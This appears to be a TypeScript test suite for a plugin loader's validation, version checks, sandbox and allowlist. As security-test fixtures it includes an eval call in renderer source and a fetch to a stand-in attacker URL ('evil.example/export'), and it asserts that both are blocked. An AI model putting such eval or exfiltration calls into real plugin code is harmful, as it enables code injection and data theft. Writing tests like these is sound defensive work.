/**
 * Component Plugin Loader Tests
 *
 * Tests for the secure plugin loading system, including validation,
 * version compatibility checks, and security policy enforcement.
 *
 * @doc.type test
 * @doc.purpose Validate plugin loading security and compatibility
 * @doc.layer product
 * @doc.pattern Security Test
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { ComponentPluginLoader, type ComponentPackageManifest } from '../pluginLoader';
import type { BuilderRendererManifest } from '../rendererManifest';

describe('ComponentPluginLoader', () => {
  let loader: ComponentPluginLoader;

  beforeEach(() => {
    loader = new ComponentPluginLoader();
  });

  describe('validation', () => {
    it('should reject manifest without package name', () => {
      const manifest: ComponentPackageManifest = {
        packageName: '',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package name is required');
    });

    it('should reject manifest without version', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Package version is required');
    });

    it('should reject manifest without minimum builder version', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Minimum builder version is required');
    });

    it('should reject manifest with version below minimum', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '2.0.0', // Higher than current (1.0.0)
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('below minimum required version'))).toBe(true);
    });

    it('should reject manifest with version above maximum', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '0.5.0',
        maxBuilderVersion: '0.9.0', // Lower than current (1.0.0)
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('exceeds maximum supported version'))).toBe(true);
    });

    it('should warn when package provides no renderers', () => {
      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.validatePackage(manifest);

      expect(result.warnings).toContain('Package provides no renderers');
    });

    it('should reject renderer without contract name', () => {
      const renderer: BuilderRendererManifest = {
        contractName: '',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('has no contract name'))).toBe(true);
    });

    it('should reject renderer without render function', () => {
      const renderer = {
        contractName: 'TestComponent',
        render: undefined as any,
      } as BuilderRendererManifest;

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('has no render function'))).toBe(true);
    });

    it('should accept valid manifest', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe('security policy', () => {
    it('should reject renderers with unsafe source code', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'UnsafeComponent',
        render: () => null,
        sourceCode: 'export const UnsafeComponent = () => <div>{eval("2+2")}</div>;',
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'unsafe-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some((error) => error.includes('blocked by security assessment'))).toBe(true);
    });

    it('should require allowlisted elevated permissions for risky renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'RiskyComponent',
        render: () => null,
        sourceCode: 'export const RiskyComponent = () => { return <button onClick={() => fetch("https://api.example.com")}>Run</button>; };',
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'risky-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const denied = loader.validatePackage(manifest);
      expect(denied.isValid).toBe(false);
      expect(denied.errors.some((error) => error.includes('requires elevated permissions'))).toBe(true);

      loader.allowPackage('risky-package');
      const elevatedManifest: ComponentPackageManifest = {
        ...manifest,
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };
      const allowed = loader.validatePackage(elevatedManifest);

      expect(allowed.isValid).toBe(true);
    });

    it('should reject package requiring elevated permissions if not allowed', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'secure-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('requires elevated permissions'))).toBe(true);
    });

    it('should accept package requiring elevated permissions if allowed', () => {
      loader.allowPackage('secure-package');

      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'secure-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          requiresElevatedPermissions: true,
        },
      };

      const result = loader.validatePackage(manifest);

      expect(result.isValid).toBe(true);
    });
  });

  describe('loading and unloading', () => {
    it('should load valid package and register renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      const result = loader.loadPackage(manifest);

      expect(result.isValid).toBe(true);
      expect(loader.getLoadedPackages()).toHaveLength(1);
      expect(loader.getRuntimeEnvironment('test-package')).not.toBeNull();
    });

    it('should not load invalid package', () => {
      const manifest: ComponentPackageManifest = {
        packageName: '',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [],
      };

      const result = loader.loadPackage(manifest);

      expect(result.isValid).toBe(false);
      expect(loader.getLoadedPackages()).toHaveLength(0);
    });

    it('should unload package and unregister renderers', () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'test-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
      };

      loader.loadPackage(manifest);
      expect(loader.getLoadedPackages()).toHaveLength(1);

      loader.unloadPackage('test-package');
      expect(loader.getLoadedPackages()).toHaveLength(0);
      expect(loader.getRuntimeEnvironment('test-package')).toBeNull();
    });

    it('creates a runtime environment that enforces plugin policy at call time', async () => {
      const renderer: BuilderRendererManifest = {
        contractName: 'TestComponent',
        render: () => null,
      };

      const manifest: ComponentPackageManifest = {
        packageName: 'runtime-package',
        version: '1.0.0',
        minBuilderVersion: '1.0.0',
        renderers: [renderer],
        securityPolicy: {
          allowedDomains: ['api.ghatana.com'],
        },
      };

      const result = loader.loadPackage(manifest);
      const runtime = loader.getRuntimeEnvironment('runtime-package');

      expect(result.isValid).toBe(true);
      expect(runtime?.sandboxAttribute).toContain('allow-scripts');
      await expect(runtime?.fetch('https://evil.example/export')!).rejects.toThrow('Plugin network request blocked');
      expect(() => runtime?.useStorage('localStorage')).toThrow('Plugin storage access blocked');
    });
  });

  describe('allowlist', () => {
    it('should allow and disallow packages', () => {
      expect(loader.isPackageAllowed('test-package')).toBe(false);

      loader.allowPackage('test-package');
      expect(loader.isPackageAllowed('test-package')).toBe(true);

      loader.disallowPackage('test-package');
      expect(loader.isPackageAllowed('test-package')).toBe(false);
    });
  });
});
